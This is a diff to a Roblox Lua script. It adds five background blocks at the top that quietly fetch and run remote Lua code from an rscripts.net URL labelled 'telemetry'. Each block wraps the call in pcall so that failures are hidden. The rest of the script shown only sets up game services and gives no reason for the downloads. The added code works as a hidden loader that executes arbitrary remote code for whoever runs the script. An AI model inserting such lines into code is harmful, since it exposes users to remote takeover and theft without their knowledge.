@@ -1,3 +1,33 @@
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6aeb5d4118ce2430d79b6993"))()
+	end)
+end)
+
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6ade649aa78295088e268de6"))()
+	end)
+end)
+
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6adb7fb877c260065ce70e0a"))()
+	end)
+end)
+
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6ada19ab16604eb67a354d7f"))()
+	end)
+end)
+
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6acb2bcbc19ff8720ec0dbb4"))()
+	end)
+end)
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local Input = game:GetService("UserInputService")
